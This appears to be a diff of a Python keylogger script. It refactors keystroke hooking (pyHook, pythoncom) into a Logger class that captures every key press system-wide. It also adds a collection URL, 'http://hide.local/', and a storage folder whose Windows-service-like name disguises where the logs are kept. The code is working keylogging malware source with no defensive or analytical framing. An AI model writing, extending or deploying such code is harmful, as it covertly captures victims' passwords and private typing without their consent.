@@ -1,6 +1,19 @@
 import pyHook, pythoncom
 import sys
-import urllib.request as req
+
+url = 'http://hide.local/'
+path = 'C\\Users\\{0}\\Documents\\WindowsService\\WindowsExceptDevice\\'.format('Admin')
+
+class Logger():
+	def __init__(self):
+		self.hm = pyHook.HookManager()
+		
+	def SetKeyDownCallback(self, callback):
+		self.hm.KeyDown = callback
+		
+	def StartLogging(self):
+		self.hm.HookKeyboard()
+		pythoncom.PumpMessages()
 
 def OnKeyboardEvent(event):
 	try:
@@ -11,9 +24,6 @@ def OnKeyboardEvent(event):
 	
 	return True
 
-
-	
-hooks_manager = pyHook.HookManager()
-hooks_manager.KeyDown = OnKeyboardEvent
-hooks_manager.HookKeyboard()
-pythoncom.PumpMessages()
+logger = Logger()
+logger.SetKeyDownCallback(OnKeyboardEvent)
+logger.StartLogging()
